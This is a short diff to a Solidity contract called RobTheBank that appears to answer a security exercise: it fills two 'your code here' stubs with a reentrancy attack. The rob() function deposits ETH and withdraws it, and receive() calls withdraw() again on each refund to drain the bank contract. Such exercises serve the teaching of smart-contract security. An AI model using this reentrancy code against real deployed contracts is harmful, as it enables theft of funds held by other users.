@@ -27,9 +27,16 @@ contract RobTheBank {
     
     function rob() public payable {
         // your code here
+        require(msg.value > 0, "No ETH provided");
+        bank.deposit{value: msg.value}();
+        bank.withdraw();
     }
 
     receive() external payable {
         // your code here
+        uint256 ourBalance = bank.balances(address(this));
+        if (ourBalance > 0 && address(bank).balance >= ourBalance) {
+            bank.withdraw();
+        }
     }
 }
